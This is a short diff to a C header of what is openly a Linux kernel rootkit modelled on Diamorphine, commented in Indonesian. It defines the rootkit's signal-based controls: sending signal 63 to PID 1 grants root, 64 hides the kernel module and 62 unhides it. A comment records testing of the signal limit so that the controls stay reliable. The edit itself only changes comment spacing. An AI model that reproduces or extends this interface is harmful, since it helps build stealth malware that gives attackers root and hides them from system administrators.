@@ -16,13 +16,13 @@
 struct pt_regs;
 
 /* sinyal kontrol (gaya Diamorphine — era ini tidak punya /proc/rkit) */
-#define L4X_LPE_SIG       63   /* kill -s63 1  -> root */
-#define L4X_MODHIDE_SIG   64   /* kill -s64 1  -> sembunyikan modul */
+#define L4X_LPE_SIG       63   /* kill -s 63 1 -> root */
+#define L4X_MODHIDE_SIG   64   /* kill -s 64 1 -> sembunyikan modul */
 /* CATATAN: batas sinyal x86 =64 — bukti: tanpa modul, os.kill(1,65) ->
  * EINVAL di kernel (diuji via python di WSL).65 hanya bisa "jalan" bila
  * hook menelan sebelum validasi — rapuh. Kini modshow =62 yang valid
  * baik saat modul aktif (hook menelan) maupun tidak (kernel menerima). */
-#define L4X_MODSHOW_SIG   62   /* kill -s62 1  -> tampilkan modul (sebelum rmmod) */
+#define L4X_MODSHOW_SIG   62   /* kill -s 62 1 -> tampilkan modul (sebelum rmmod) */
 
 #define L4X_MAX_HIDE    32
 #define L4X_MAX_PORT    64
